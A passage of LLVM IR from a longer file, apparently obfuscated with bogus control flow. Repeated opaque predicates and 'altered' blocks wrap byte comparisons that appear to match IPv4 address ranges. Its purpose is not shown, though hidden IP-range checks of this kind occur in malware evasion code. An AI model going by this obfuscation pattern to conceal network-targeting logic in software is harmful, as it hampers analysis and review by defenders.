  %4282 = icmp slt i32 %4277, 10
  %4283 = or i1 %4281, %4282
  br i1 %4283, label %originalBB582, label %originalBB582alteredBB

originalBB582:                                    ; preds = %originalBB582alteredBB, %4275
  %4284 = load i8, i8* %4, align 1
  %4285 = zext i8 %4284 to i32
  %4286 = icmp slt i32 %4285, 187
  %4287 = load i32, i32* @x.57
  %4288 = load i32, i32* @y.58
  %4289 = sub i32 %4287, 1
  %4290 = mul i32 %4287, %4289
  %4291 = urem i32 %4290, 2
  %4292 = icmp eq i32 %4291, 0
  %4293 = icmp slt i32 %4288, 10
  %4294 = or i1 %4292, %4293
  br i1 %4294, label %originalBBpart2584, label %originalBB582alteredBB

originalBBpart2584:                               ; preds = %originalBB582
  br i1 %4286, label %5259, label %4295

; <label>:4295:                                   ; preds = %originalBBpart2584, %4271, %4267, %originalBBpart2580
  %4296 = load i32, i32* @x.57
  %4297 = load i32, i32* @y.58
  %4298 = sub i32 %4296, 1
  %4299 = mul i32 %4296, %4298
  %4300 = urem i32 %4299, 2
  %4301 = icmp eq i32 %4300, 0
  %4302 = icmp slt i32 %4297, 10
  %4303 = or i1 %4301, %4302
  br i1 %4303, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %4295
  %4304 = load i8, i8* %2, align 1
  %4305 = zext i8 %4304 to i32
  %4306 = icmp eq i32 %4305, 206
  %4307 = load i32, i32* @x.57
  %4308 = load i32, i32* @y.58
  %4309 = sub i32 %4307, 1
  %4310 = mul i32 %4307, %4309
  %4311 = urem i32 %4310, 2
  %4312 = icmp eq i32 %4311, 0
  %4313 = icmp slt i32 %4308, 10
  %4314 = or i1 %4312, %4313
  br i1 %4314, label %originalBBpart2588, label %originalBB586alteredBB

originalBBpart2588:                               ; preds = %originalBB586
  br i1 %4306, label %4315, label %4359

; <label>:4315:                                   ; preds = %originalBBpart2588
  %4316 = load i8, i8* %3, align 1
  %4317 = zext i8 %4316 to i32
  %4318 = icmp eq i32 %4317, 220
  br i1 %4318, label %4319, label %4359

; <label>:4319:                                   ; preds = %4315
  %4320 = load i32, i32* @x.57
  %4321 = load i32, i32* @y.58
  %4322 = sub i32 %4320, 1
  %4323 = mul i32 %4320, %4322
  %4324 = urem i32 %4323, 2
  %4325 = icmp eq i32 %4324, 0
  %4326 = icmp slt i32 %4321, 10
  %4327 = or i1 %4325, %4326
  br i1 %4327, label %originalBB590, label %originalBB590alteredBB

originalBB590:                                    ; preds = %originalBB590alteredBB, %4319
  %4328 = load i8, i8* %4, align 1
  %4329 = zext i8 %4328 to i32
  %4330 = icmp sge i32 %4329, 172
  %4331 = load i32, i32* @x.57
  %4332 = load i32, i32* @y.58
  %4333 = sub i32 %4331, 1
  %4334 = mul i32 %4331, %4333
  %4335 = urem i32 %4334, 2
  %4336 = icmp eq i32 %4335, 0
  %4337 = icmp slt i32 %4332, 10
  %4338 = or i1 %4336, %4337
  br i1 %4338, label %originalBBpart2592, label %originalBB590alteredBB

originalBBpart2592:                               ; preds = %originalBB590
  br i1 %4330, label %4339, label %4359

; <label>:4339:                                   ; preds = %originalBBpart2592
  %4340 = load i32, i32* @x.57
  %4341 = load i32, i32* @y.58
  %4342 = sub i32 %4340, 1
  %4343 = mul i32 %4340, %4342
  %4344 = urem i32 %4343, 2
  %4345 = icmp eq i32 %4344, 0
  %4346 = icmp slt i32 %4341, 10
  %4347 = or i1 %4345, %4346
  br i1 %4347, label %originalBB594, label %originalBB594alteredBB

originalBB594:                                    ; preds = %originalBB594alteredBB, %4339
  %4348 = load i8, i8* %4, align 1
  %4349 = zext i8 %4348 to i32
  %4350 = icmp slt i32 %4349, 175
  %4351 = load i32, i32* @x.57
  %4352 = load i32, i32* @y.58
  %4353 = sub i32 %4351, 1
  %4354 = mul i32 %4351, %4353
  %4355 = urem i32 %4354, 2
  %4356 = icmp eq i32 %4355, 0
  %4357 = icmp slt i32 %4352, 10
  %4358 = or i1 %4356, %4357
  br i1 %4358, label %originalBBpart2596, label %originalBB594alteredBB

originalBBpart2596:                               ; preds = %originalBB594
  br i1 %4350, label %5259, label %4359

; <label>:4359:                                   ; preds = %originalBBpart2596, %originalBBpart2592, %4315, %originalBBpart2588
  %4360 = load i32, i32* @x.57
  %4361 = load i32, i32* @y.58
  %4362 = sub i32 %4360, 1
  %4363 = mul i32 %4360, %4362
  %4364 = urem i32 %4363, 2
  %4365 = icmp eq i32 %4364, 0
  %4366 = icmp slt i32 %4361, 10
  %4367 = or i1 %4365, %4366
  br i1 %4367, label %originalBB598, label %originalBB598alteredBB

originalBB598:                                    ; preds = %originalBB598alteredBB, %4359
  %4368 = load i8, i8* %2, align 1
  %4369 = zext i8 %4368 to i32
  %4370 = icmp eq i32 %4369, 208
  %4371 = load i32, i32* @x.57
  %4372 = load i32, i32* @y.58
  %4373 = sub i32 %4371, 1
  %4374 = mul i32 %4371, %4373
  %4375 = urem i32 %4374, 2
  %4376 = icmp eq i32 %4375, 0
  %4377 = icmp slt i32 %4372, 10
  %4378 = or i1 %4376, %4377
  br i1 %4378, label %originalBBpart2600, label %originalBB598alteredBB

originalBBpart2600:                               ; preds = %originalBB598
  br i1 %4370, label %4379, label %4391

; <label>:4379:                                   ; preds = %originalBBpart2600
  %4380 = load i8, i8* %3, align 1
  %4381 = zext i8 %4380 to i32
  %4382 = icmp eq i32 %4381, 78
  br i1 %4382, label %4383, label %4391

; <label>:4383:                                   ; preds = %4379
  %4384 = load i8, i8* %4, align 1
  %4385 = zext i8 %4384 to i32
  %4386 = icmp sge i32 %4385, 40
  br i1 %4386, label %4387, label %4391

; <label>:4387:                                   ; preds = %4383
  %4388 = load i8, i8* %4, align 1
  %4389 = zext i8 %4388 to i32
  %4390 = icmp slt i32 %4389, 43
  br i1 %4390, label %5259, label %4391

; <label>:4391:                                   ; preds = %4387, %4383, %4379, %originalBBpart2600
  %4392 = load i8, i8* %2, align 1
  %4393 = zext i8 %4392 to i32
  %4394 = icmp eq i32 %4393, 208
  br i1 %4394, label %4395, label %4407

; <label>:4395:                                   ; preds = %4391
  %4396 = load i8, i8* %3, align 1
  %4397 = zext i8 %4396 to i32
  %4398 = icmp eq i32 %4397, 93
  br i1 %4398, label %4399, label %4407

; <label>:4399:                                   ; preds = %4395
  %4400 = load i8, i8* %4, align 1
  %4401 = zext i8 %4400 to i32
  %4402 = icmp sge i32 %4401, 192
  br i1 %4402, label %4403, label %4407

; <label>:4403:                                   ; preds = %4399
  %4404 = load i8, i8* %4, align 1
  %4405 = zext i8 %4404 to i32
  %4406 = icmp slt i32 %4405, 193
  br i1 %4406, label %5259, label %4407

; <label>:4407:                                   ; preds = %4403, %4399, %4395, %4391
  %4408 = load i32, i32* @x.57
  %4409 = load i32, i32* @y.58
  %4410 = sub i32 %4408, 1
  %4411 = mul i32 %4408, %4410
  %4412 = urem i32 %4411, 2
  %4413 = icmp eq i32 %4412, 0
  %4414 = icmp slt i32 %4409, 10
  %4415 = or i1 %4413, %4414
  br i1 %4415, label %originalBB602, label %originalBB602alteredBB

originalBB602:                                    ; preds = %originalBB602alteredBB, %4407
  %4416 = load i8, i8* %2, align 1
  %4417 = zext i8 %4416 to i32
  %4418 = icmp eq i32 %4417, 66
  %4419 = load i32, i32* @x.57
  %4420 = load i32, i32* @y.58
  %4421 = sub i32 %4419, 1
  %4422 = mul i32 %4419, %4421
  %4423 = urem i32 %4422, 2
  %4424 = icmp eq i32 %4423, 0
  %4425 = icmp slt i32 %4420, 10
  %4426 = or i1 %4424, %4425
  br i1 %4426, label %originalBBpart2604, label %originalBB602alteredBB

originalBBpart2604:                               ; preds = %originalBB602
  br i1 %4418, label %4427, label %4455

; <label>:4427:                                   ; preds = %originalBBpart2604
  %4428 = load i32, i32* @x.57
  %4429 = load i32, i32* @y.58
  %4430 = sub i32 %4428, 1
  %4431 = mul i32 %4428, %4430
  %4432 = urem i32 %4431, 2
  %4433 = icmp eq i32 %4432, 0
  %4434 = icmp slt i32 %4429, 10
  %4435 = or i1 %4433, %4434
  br i1 %4435, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %4427
  %4436 = load i8, i8* %3, align 1
  %4437 = zext i8 %4436 to i32
  %4438 = icmp eq i32 %4437, 71
  %4439 = load i32, i32* @x.57
  %4440 = load i32, i32* @y.58
  %4441 = sub i32 %4439, 1
  %4442 = mul i32 %4439, %4441
  %4443 = urem i32 %4442, 2
  %4444 = icmp eq i32 %4443, 0
  %4445 = icmp slt i32 %4440, 10
  %4446 = or i1 %4444, %4445
  br i1 %4446, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br i1 %4438, label %4447, label %4455

; <label>:4447:                                   ; preds = %originalBBpart2608
  %4448 = load i8, i8* %4, align 1
  %4449 = zext i8 %4448 to i32
  %4450 = icmp sge i32 %4449, 240
  br i1 %4450, label %4451, label %4455

; <label>:4451:                                   ; preds = %4447
  %4452 = load i8, i8* %4, align 1
  %4453 = zext i8 %4452 to i32
  %4454 = icmp slt i32 %4453, 255
  br i1 %4454, label %5259, label %4455

; <label>:4455:                                   ; preds = %4451, %4447, %originalBBpart2608, %originalBBpart2604
  %4456 = load i8, i8* %2, align 1
  %4457 = zext i8 %4456 to i32
  %4458 = icmp eq i32 %4457, 98
  br i1 %4458, label %4459, label %4487

; <label>:4459:                                   ; preds = %4455
  %4460 = load i8, i8* %3, align 1
  %4461 = zext i8 %4460 to i32
  %4462 = icmp eq i32 %4461, 142
  br i1 %4462, label %4463, label %4487

; <label>:4463:                                   ; preds = %4459
  %4464 = load i8, i8* %4, align 1
  %4465 = zext i8 %4464 to i32
  %4466 = icmp sge i32 %4465, 208
  br i1 %4466, label %4467, label %4487

; <label>:4467:                                   ; preds = %4463
  %4468 = load i32, i32* @x.57
  %4469 = load i32, i32* @y.58
  %4470 = sub i32 %4468, 1
  %4471 = mul i32 %4468, %4470
  %4472 = urem i32 %4471, 2
  %4473 = icmp eq i32 %4472, 0
  %4474 = icmp slt i32 %4469, 10
  %4475 = or i1 %4473, %4474
  br i1 %4475, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %4467
  %4476 = load i8, i8* %4, align 1
  %4477 = zext i8 %4476 to i32
  %4478 = icmp slt i32 %4477, 223
  %4479 = load i32, i32* @x.57
  %4480 = load i32, i32* @y.58
  %4481 = sub i32 %4479, 1
  %4482 = mul i32 %4479, %4481
  %4483 = urem i32 %4482, 2
  %4484 = icmp eq i32 %4483, 0
  %4485 = icmp slt i32 %4480, 10
  %4486 = or i1 %4484, %4485
  br i1 %4486, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br i1 %4478, label %5259, label %4487

; <label>:4487:                                   ; preds = %originalBBpart2612, %4463, %4459, %4455
  %4488 = load i32, i32* @x.57
  %4489 = load i32, i32* @y.58
  %4490 = sub i32 %4488, 1
  %4491 = mul i32 %4488, %4490
  %4492 = urem i32 %4491, 2
  %4493 = icmp eq i32 %4492, 0
  %4494 = icmp slt i32 %4489, 10
  %4495 = or i1 %4493, %4494
  br i1 %4495, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %4487
  %4496 = load i8, i8* %2, align 1
  %4497 = zext i8 %4496 to i32
  %4498 = icmp eq i32 %4497, 107
  %4499 = load i32, i32* @x.57
  %4500 = load i32, i32* @y.58
  %4501 = sub i32 %4499, 1
  %4502 = mul i32 %4499, %4501
  %4503 = urem i32 %4502, 2
  %4504 = icmp eq i32 %4503, 0
  %4505 = icmp slt i32 %4500, 10
  %4506 = or i1 %4504, %4505
  br i1 %4506, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %4498, label %4507, label %4547

; <label>:4507:                                   ; preds = %originalBBpart2616
  %4508 = load i32, i32* @x.57
  %4509 = load i32, i32* @y.58
  %4510 = sub i32 %4508, 1
  %4511 = mul i32 %4508, %4510
  %4512 = urem i32 %4511, 2
  %4513 = icmp eq i32 %4512, 0
  %4514 = icmp slt i32 %4509, 10
  %4515 = or i1 %4513, %4514
  br i1 %4515, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %4507
  %4516 = load i8, i8* %3, align 1
  %4517 = zext i8 %4516 to i32
  %4518 = icmp sge i32 %4517, 20
  %4519 = load i32, i32* @x.57
  %4520 = load i32, i32* @y.58
  %4521 = sub i32 %4519, 1
  %4522 = mul i32 %4519, %4521
  %4523 = urem i32 %4522, 2
  %4524 = icmp eq i32 %4523, 0
  %4525 = icmp slt i32 %4520, 10
  %4526 = or i1 %4524, %4525
  br i1 %4526, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br i1 %4518, label %4527, label %4547

; <label>:4527:                                   ; preds = %originalBBpart2620
  %4528 = load i32, i32* @x.57
  %4529 = load i32, i32* @y.58
  %4530 = sub i32 %4528, 1
  %4531 = mul i32 %4528, %4530
  %4532 = urem i32 %4531, 2
  %4533 = icmp eq i32 %4532, 0
  %4534 = icmp slt i32 %4529, 10
  %4535 = or i1 %4533, %4534
  br i1 %4535, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %4527
  %4536 = load i8, i8* %3, align 1
  %4537 = zext i8 %4536 to i32
  %4538 = icmp slt i32 %4537, 24
  %4539 = load i32, i32* @x.57
  %4540 = load i32, i32* @y.58
  %4541 = sub i32 %4539, 1
  %4542 = mul i32 %4539, %4541
  %4543 = urem i32 %4542, 2
  %4544 = icmp eq i32 %4543, 0
  %4545 = icmp slt i32 %4540, 10
  %4546 = or i1 %4544, %4545
  br i1 %4546, label %originalBBpart2624, label %originalBB622alteredBB

originalBBpart2624:                               ; preds = %originalBB622
  br i1 %4538, label %5259, label %4547

; <label>:4547:                                   ; preds = %originalBBpart2624, %originalBBpart2620, %originalBBpart2616
  %4548 = load i32, i32* @x.57
  %4549 = load i32, i32* @y.58
  %4550 = sub i32 %4548, 1
  %4551 = mul i32 %4548, %4550
  %4552 = urem i32 %4551, 2
  %4553 = icmp eq i32 %4552, 0
  %4554 = icmp slt i32 %4549, 10
  %4555 = or i1 %4553, %4554
  br i1 %4555, label %originalBB626, label %originalBB626alteredBB

originalBB626:                                    ; preds = %originalBB626alteredBB, %4547
  %4556 = load i8, i8* %2, align 1
  %4557 = zext i8 %4556 to i32
  %4558 = icmp eq i32 %4557, 35
  %4559 = load i32, i32* @x.57
  %4560 = load i32, i32* @y.58
  %4561 = sub i32 %4559, 1
  %4562 = mul i32 %4559, %4561
  %4563 = urem i32 %4562, 2
  %4564 = icmp eq i32 %4563, 0
  %4565 = icmp slt i32 %4560, 10
  %4566 = or i1 %4564, %4565
  br i1 %4566, label %originalBBpart2628, label %originalBB626alteredBB

originalBBpart2628:                               ; preds = %originalBB626
  br i1 %4558, label %4567, label %4591

; <label>:4567:                                   ; preds = %originalBBpart2628
  %4568 = load i32, i32* @x.57
  %4569 = load i32, i32* @y.58
  %4570 = sub i32 %4568, 1
  %4571 = mul i32 %4568, %4570
  %4572 = urem i32 %4571, 2
  %4573 = icmp eq i32 %4572, 0
  %4574 = icmp slt i32 %4569, 10
  %4575 = or i1 %4573, %4574
  br i1 %4575, label %originalBB630, label %originalBB630alteredBB

originalBB630:                                    ; preds = %originalBB630alteredBB, %4567
  %4576 = load i8, i8* %3, align 1
  %4577 = zext i8 %4576 to i32
  %4578 = icmp sge i32 %4577, 159
  %4579 = load i32, i32* @x.57
  %4580 = load i32, i32* @y.58
  %4581 = sub i32 %4579, 1
  %4582 = mul i32 %4579, %4581
  %4583 = urem i32 %4582, 2
  %4584 = icmp eq i32 %4583, 0
  %4585 = icmp slt i32 %4580, 10
  %4586 = or i1 %4584, %4585
  br i1 %4586, label %originalBBpart2632, label %originalBB630alteredBB

originalBBpart2632:                               ; preds = %originalBB630
  br i1 %4578, label %4587, label %4591

; <label>:4587:                                   ; preds = %originalBBpart2632
  %4588 = load i8, i8* %3, align 1
  %4589 = zext i8 %4588 to i32
  %4590 = icmp slt i32 %4589, 183
  br i1 %4590, label %5259, label %4591

; <label>:4591:                                   ; preds = %4587, %originalBBpart2632, %originalBBpart2628
  %4592 = load i32, i32* @x.57
  %4593 = load i32, i32* @y.58
  %4594 = sub i32 %4592, 1
  %4595 = mul i32 %4592, %4594
  %4596 = urem i32 %4595, 2
  %4597 = icmp eq i32 %4596, 0
  %4598 = icmp slt i32 %4593, 10
  %4599 = or i1 %4597, %4598
  br i1 %4599, label %originalBB634, label %originalBB634alteredBB

originalBB634:                                    ; preds = %originalBB634alteredBB, %4591
  %4600 = load i8, i8* %2, align 1
  %4601 = zext i8 %4600 to i32
  %4602 = icmp eq i32 %4601, 52
  %4603 = load i32, i32* @x.57
  %4604 = load i32, i32* @y.58
  %4605 = sub i32 %4603, 1
  %4606 = mul i32 %4603, %4605
  %4607 = urem i32 %4606, 2
  %4608 = icmp eq i32 %4607, 0
  %4609 = icmp slt i32 %4604, 10
  %4610 = or i1 %4608, %4609
  br i1 %4610, label %originalBBpart2636, label %originalBB634alteredBB

originalBBpart2636:                               ; preds = %originalBB634
  br i1 %4602, label %4611, label %4635

; <label>:4611:                                   ; preds = %originalBBpart2636
  %4612 = load i32, i32* @x.57
  %4613 = load i32, i32* @y.58
  %4614 = sub i32 %4612, 1
  %4615 = mul i32 %4612, %4614
  %4616 = urem i32 %4615, 2
  %4617 = icmp eq i32 %4616, 0
  %4618 = icmp slt i32 %4613, 10
  %4619 = or i1 %4617, %4618
  br i1 %4619, label %originalBB638, label %originalBB638alteredBB

originalBB638:                                    ; preds = %originalBB638alteredBB, %4611
  %4620 = load i8, i8* %3, align 1
  %4621 = zext i8 %4620 to i32
  %4622 = icmp sge i32 %4621, 1
  %4623 = load i32, i32* @x.57
  %4624 = load i32, i32* @y.58
  %4625 = sub i32 %4623, 1
  %4626 = mul i32 %4623, %4625
  %4627 = urem i32 %4626, 2
  %4628 = icmp eq i32 %4627, 0
  %4629 = icmp slt i32 %4624, 10
  %4630 = or i1 %4628, %4629
  br i1 %4630, label %originalBBpart2640, label %originalBB638alteredBB

originalBBpart2640:                               ; preds = %originalBB638
  br i1 %4622, label %4631, label %4635

; <label>:4631:                                   ; preds = %originalBBpart2640
  %4632 = load i8, i8* %3, align 1
  %4633 = zext i8 %4632 to i32
  %4634 = icmp slt i32 %4633, 95
  br i1 %4634, label %5259, label %4635

; <label>:4635:                                   ; preds = %4631, %originalBBpart2640, %originalBBpart2636
  %4636 = load i8, i8* %2, align 1
  %4637 = zext i8 %4636 to i32
  %4638 = icmp eq i32 %4637, 52
  br i1 %4638, label %4639, label %4647

; <label>:4639:                                   ; preds = %4635
  %4640 = load i8, i8* %3, align 1
  %4641 = zext i8 %4640 to i32
  %4642 = icmp sge i32 %4641, 95
  br i1 %4642, label %4643, label %4647

; <label>:4643:                                   ; preds = %4639
  %4644 = load i8, i8* %3, align 1
  %4645 = zext i8 %4644 to i32
  %4646 = icmp slt i32 %4645, 255
  br i1 %4646, label %5259, label %4647

; <label>:4647:                                   ; preds = %4643, %4639, %4635
  %4648 = load i8, i8* %2, align 1
  %4649 = zext i8 %4648 to i32
  %4650 = icmp eq i32 %4649, 54
  br i1 %4650, label %4651, label %4691

; <label>:4651:                                   ; preds = %4647
  %4652 = load i32, i32* @x.57
  %4653 = load i32, i32* @y.58
  %4654 = sub i32 %4652, 1
  %4655 = mul i32 %4652, %4654
  %4656 = urem i32 %4655, 2
  %4657 = icmp eq i32 %4656, 0
  %4658 = icmp slt i32 %4653, 10
  %4659 = or i1 %4657, %4658
  br i1 %4659, label %originalBB642, label %originalBB642alteredBB

originalBB642:                                    ; preds = %originalBB642alteredBB, %4651
  %4660 = load i8, i8* %3, align 1
  %4661 = zext i8 %4660 to i32
  %4662 = icmp sge i32 %4661, 64
  %4663 = load i32, i32* @x.57
  %4664 = load i32, i32* @y.58
  %4665 = sub i32 %4663, 1
  %4666 = mul i32 %4663, %4665
  %4667 = urem i32 %4666, 2
  %4668 = icmp eq i32 %4667, 0
  %4669 = icmp slt i32 %4664, 10
  %4670 = or i1 %4668, %4669
  br i1 %4670, label %originalBBpart2644, label %originalBB642alteredBB

originalBBpart2644:                               ; preds = %originalBB642
  br i1 %4662, label %4671, label %4691

; <label>:4671:                                   ; preds = %originalBBpart2644
  %4672 = load i32, i32* @x.57
  %4673 = load i32, i32* @y.58
  %4674 = sub i32 %4672, 1
  %4675 = mul i32 %4672, %4674
  %4676 = urem i32 %4675, 2
  %4677 = icmp eq i32 %4676, 0
  %4678 = icmp slt i32 %4673, 10
  %4679 = or i1 %4677, %4678
  br i1 %4679, label %originalBB646, label %originalBB646alteredBB

originalBB646:                                    ; preds = %originalBB646alteredBB, %4671
  %4680 = load i8, i8* %3, align 1
  %4681 = zext i8 %4680 to i32
  %4682 = icmp slt i32 %4681, 95
  %4683 = load i32, i32* @x.57
  %4684 = load i32, i32* @y.58
  %4685 = sub i32 %4683, 1
  %4686 = mul i32 %4683, %4685
  %4687 = urem i32 %4686, 2
  %4688 = icmp eq i32 %4687, 0
  %4689 = icmp slt i32 %4684, 10
  %4690 = or i1 %4688, %4689
  br i1 %4690, label %originalBBpart2648, label %originalBB646alteredBB

originalBBpart2648:                               ; preds = %originalBB646
  br i1 %4682, label %5259, label %4691

; <label>:4691:                                   ; preds = %originalBBpart2648, %originalBBpart2644, %4647
  %4692 = load i8, i8* %2, align 1
  %4693 = zext i8 %4692 to i32
  %4694 = icmp eq i32 %4693, 54
  br i1 %4694, label %4695, label %4719

; <label>:4695:                                   ; preds = %4691
  %4696 = load i8, i8* %3, align 1
  %4697 = zext i8 %4696 to i32
  %4698 = icmp sge i32 %4697, 144
  br i1 %4698, label %4699, label %4719

; <label>:4699:                                   ; preds = %4695
  %4700 = load i32, i32* @x.57
  %4701 = load i32, i32* @y.58
  %4702 = sub i32 %4700, 1
  %4703 = mul i32 %4700, %4702
  %4704 = urem i32 %4703, 2
  %4705 = icmp eq i32 %4704, 0
  %4706 = icmp slt i32 %4701, 10
  %4707 = or i1 %4705, %4706
  br i1 %4707, label %originalBB650, label %originalBB650alteredBB

originalBB650:                                    ; preds = %originalBB650alteredBB, %4699
  %4708 = load i8, i8* %3, align 1
  %4709 = zext i8 %4708 to i32
  %4710 = icmp slt i32 %4709, 255
  %4711 = load i32, i32* @x.57
  %4712 = load i32, i32* @y.58
  %4713 = sub i32 %4711, 1
  %4714 = mul i32 %4711, %4713
  %4715 = urem i32 %4714, 2
  %4716 = icmp eq i32 %4715, 0
  %4717 = icmp slt i32 %4712, 10
  %4718 = or i1 %4716, %4717
  br i1 %4718, label %originalBBpart2652, label %originalBB650alteredBB

originalBBpart2652:                               ; preds = %originalBB650
  br i1 %4710, label %5259, label %4719

; <label>:4719:                                   ; preds = %originalBBpart2652, %4695, %4691
  %4720 = load i32, i32* @x.57
  %4721 = load i32, i32* @y.58
  %4722 = sub i32 %4720, 1
  %4723 = mul i32 %4720, %4722
  %4724 = urem i32 %4723, 2
  %4725 = icmp eq i32 %4724, 0
  %4726 = icmp slt i32 %4721, 10
  %4727 = or i1 %4725, %4726
  br i1 %4727, label %originalBB654, label %originalBB654alteredBB

originalBB654:                                    ; preds = %originalBB654alteredBB, %4719
  %4728 = load i8, i8* %2, align 1
  %4729 = zext i8 %4728 to i32
  %4730 = icmp eq i32 %4729, 13
  %4731 = load i32, i32* @x.57
  %4732 = load i32, i32* @y.58
  %4733 = sub i32 %4731, 1
  %4734 = mul i32 %4731, %4733
  %4735 = urem i32 %4734, 2
  %4736 = icmp eq i32 %4735, 0
  %4737 = icmp slt i32 %4732, 10
  %4738 = or i1 %4736, %4737
  br i1 %4738, label %originalBBpart2656, label %originalBB654alteredBB

originalBBpart2656:                               ; preds = %originalBB654
  br i1 %4730, label %4739, label %4779

; <label>:4739:                                   ; preds = %originalBBpart2656
  %4740 = load i32, i32* @x.57
  %4741 = load i32, i32* @y.58
  %4742 = sub i32 %4740, 1
  %4743 = mul i32 %4740, %4742
  %4744 = urem i32 %4743, 2
  %4745 = icmp eq i32 %4744, 0
  %4746 = icmp slt i32 %4741, 10
  %4747 = or i1 %4745, %4746
  br i1 %4747, label %originalBB658, label %originalBB658alteredBB

originalBB658:                                    ; preds = %originalBB658alteredBB, %4739
  %4748 = load i8, i8* %3, align 1
  %4749 = zext i8 %4748 to i32
  %4750 = icmp sge i32 %4749, 52
  %4751 = load i32, i32* @x.57
  %4752 = load i32, i32* @y.58
  %4753 = sub i32 %4751, 1
  %4754 = mul i32 %4751, %4753
  %4755 = urem i32 %4754, 2
  %4756 = icmp eq i32 %4755, 0
  %4757 = icmp slt i32 %4752, 10
  %4758 = or i1 %4756, %4757
  br i1 %4758, label %originalBBpart2660, label %originalBB658alteredBB

originalBBpart2660:                               ; preds = %originalBB658
  br i1 %4750, label %4759, label %4779

; <label>:4759:                                   ; preds = %originalBBpart2660
  %4760 = load i32, i32* @x.57
  %4761 = load i32, i32* @y.58
  %4762 = sub i32 %4760, 1
  %4763 = mul i32 %4760, %4762
  %4764 = urem i32 %4763, 2
  %4765 = icmp eq i32 %4764, 0
  %4766 = icmp slt i32 %4761, 10
  %4767 = or i1 %4765, %4766
  br i1 %4767, label %originalBB662, label %originalBB662alteredBB

originalBB662:                                    ; preds = %originalBB662alteredBB, %4759
  %4768 = load i8, i8* %3, align 1
  %4769 = zext i8 %4768 to i32
  %4770 = icmp slt i32 %4769, 60
  %4771 = load i32, i32* @x.57
  %4772 = load i32, i32* @y.58
  %4773 = sub i32 %4771, 1
  %4774 = mul i32 %4771, %4773
  %4775 = urem i32 %4774, 2
  %4776 = icmp eq i32 %4775, 0
  %4777 = icmp slt i32 %4772, 10
  %4778 = or i1 %4776, %4777
  br i1 %4778, label %originalBBpart2664, label %originalBB662alteredBB

originalBBpart2664:                               ; preds = %originalBB662
  br i1 %4770, label %5259, label %4779

; <label>:4779:                                   ; preds = %originalBBpart2664, %originalBBpart2660, %originalBBpart2656
  %4780 = load i32, i32* @x.57
  %4781 = load i32, i32* @y.58
  %4782 = sub i32 %4780, 1
  %4783 = mul i32 %4780, %4782
  %4784 = urem i32 %4783, 2
  %4785 = icmp eq i32 %4784, 0
  %4786 = icmp slt i32 %4781, 10
  %4787 = or i1 %4785, %4786
  br i1 %4787, label %originalBB666, label %originalBB666alteredBB

originalBB666:                                    ; preds = %originalBB666alteredBB, %4779
  %4788 = load i8, i8* %2, align 1
  %4789 = zext i8 %4788 to i32
  %4790 = icmp eq i32 %4789, 13
  %4791 = load i32, i32* @x.57
  %4792 = load i32, i32* @y.58
  %4793 = sub i32 %4791, 1
  %4794 = mul i32 %4791, %4793
  %4795 = urem i32 %4794, 2
  %4796 = icmp eq i32 %4795, 0
  %4797 = icmp slt i32 %4792, 10
  %4798 = or i1 %4796, %4797
  br i1 %4798, label %originalBBpart2668, label %originalBB666alteredBB

originalBBpart2668:                               ; preds = %originalBB666
  br i1 %4790, label %4799, label %4807

; <label>:4799:                                   ; preds = %originalBBpart2668
  %4800 = load i8, i8* %3, align 1
  %4801 = zext i8 %4800 to i32
  %4802 = icmp sge i32 %4801, 112
  br i1 %4802, label %4803, label %4807

; <label>:4803:                                   ; preds = %4799
  %4804 = load i8, i8* %3, align 1
  %4805 = zext i8 %4804 to i32
  %4806 = icmp slt i32 %4805, 115
  br i1 %4806, label %5259, label %4807

; <label>:4807:                                   ; preds = %4803, %4799, %originalBBpart2668
  %4808 = load i8, i8* %2, align 1
  %4809 = zext i8 %4808 to i32
  %4810 = icmp eq i32 %4809, 163
  br i1 %4810, label %4811, label %4815

; <label>:4811:                                   ; preds = %4807
  %4812 = load i8, i8* %3, align 1
  %4813 = zext i8 %4812 to i32
  %4814 = icmp eq i32 %4813, 172
  br i1 %4814, label %5259, label %4815

; <label>:4815:                                   ; preds = %4811, %4807
  %4816 = load i8, i8* %2, align 1
  %4817 = zext i8 %4816 to i32
  %4818 = icmp eq i32 %4817, 51
  br i1 %4818, label %4819, label %4843

; <label>:4819:                                   ; preds = %4815
  %4820 = load i8, i8* %3, align 1
  %4821 = zext i8 %4820 to i32
  %4822 = icmp sge i32 %4821, 15
  br i1 %4822, label %4823, label %4843

; <label>:4823:                                   ; preds = %4819
  %4824 = load i32, i32* @x.57
  %4825 = load i32, i32* @y.58
  %4826 = sub i32 %4824, 1
  %4827 = mul i32 %4824, %4826
  %4828 = urem i32 %4827, 2
  %4829 = icmp eq i32 %4828, 0
  %4830 = icmp slt i32 %4825, 10
  %4831 = or i1 %4829, %4830
  br i1 %4831, label %originalBB670, label %originalBB670alteredBB

originalBB670:                                    ; preds = %originalBB670alteredBB, %4823
  %4832 = load i8, i8* %3, align 1
  %4833 = zext i8 %4832 to i32
  %4834 = icmp slt i32 %4833, 255
  %4835 = load i32, i32* @x.57
  %4836 = load i32, i32* @y.58
  %4837 = sub i32 %4835, 1
  %4838 = mul i32 %4835, %4837
  %4839 = urem i32 %4838, 2
  %4840 = icmp eq i32 %4839, 0
  %4841 = icmp slt i32 %4836, 10
  %4842 = or i1 %4840, %4841
  br i1 %4842, label %originalBBpart2672, label %originalBB670alteredBB

originalBBpart2672:                               ; preds = %originalBB670
  br i1 %4834, label %5259, label %4843

; <label>:4843:                                   ; preds = %originalBBpart2672, %4819, %4815
  %4844 = load i8, i8* %2, align 1
  %4845 = zext i8 %4844 to i32
  %4846 = icmp eq i32 %4845, 79
  br i1 %4846, label %4847, label %4891

; <label>:4847:                                   ; preds = %4843
  %4848 = load i8, i8* %3, align 1
  %4849 = zext i8 %4848 to i32
  %4850 = icmp eq i32 %4849, 121
